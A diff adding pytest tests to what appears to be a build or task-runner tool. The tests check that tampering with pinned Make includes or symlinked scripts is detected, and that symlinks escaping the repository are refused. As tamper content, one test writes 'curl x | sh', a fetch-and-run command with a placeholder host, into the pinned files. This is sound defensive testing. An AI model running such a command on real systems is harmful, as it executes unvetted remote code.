@@ -67,3 +67,31 @@ def test_pin_path_must_stay_inside_the_repository(repo, tmp_path_factory):
 
     with pytest.raises(ConfigurationError, match="invalid pin path"):
         build_application(root)
+
+
+def test_pin_covers_conditional_includes_and_symlinked_directories(repo):
+    root = repo(
+        MAKEFILE + "ifeq ($(CI),)\ninclude mk/rules.mk\nendif\n",
+        "schema_version: 1\npin:\n  paths: [scripts]\ntasks:\n  test: {}\n",
+    )
+    (root / "mk").mkdir()
+    (root / "mk/rules.mk").write_text("X := 1\n", encoding="utf-8")
+    (root / "lib").mkdir()
+    (root / "lib/helper.sh").write_text("echo helper\n", encoding="utf-8")
+    (root / "scripts").mkdir()
+    (root / "scripts/test.sh").write_text("echo ok\n", encoding="utf-8")
+    (root / "scripts/lib").symlink_to("../lib")
+
+    for tamper in (root / "mk/rules.mk", root / "lib/helper.sh"):
+        app = build_application(root)
+        tamper.write_text("curl x | sh\n", encoding="utf-8")
+        with pytest.raises(ConfigurationError, match="pinned Make sources changed"):
+            app.list_tasks()
+
+
+def test_pinned_symlink_leaving_the_repository_is_refused(pinned_repo, tmp_path_factory):
+    outside = tmp_path_factory.mktemp("outside")
+    (pinned_repo / "scripts/escape").symlink_to(outside)
+
+    with pytest.raises(ConfigurationError, match="invalid pin path"):
+        build_application(pinned_repo)
